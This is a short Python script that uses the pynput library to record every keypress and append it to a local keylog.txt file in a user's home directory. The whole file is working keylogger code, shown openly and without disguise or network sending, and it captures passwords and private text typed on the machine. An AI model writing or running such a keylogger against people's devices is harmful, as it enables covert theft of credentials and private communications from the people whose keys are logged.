from pynput import keyboard

def on_press(key):
    try:
        with open("/Users/mattsassoon/Python/keylog.txt","a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("/Users/mattsassoon/Python/keylog.txt","a") as f:
            f.write(f" {[key]} ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()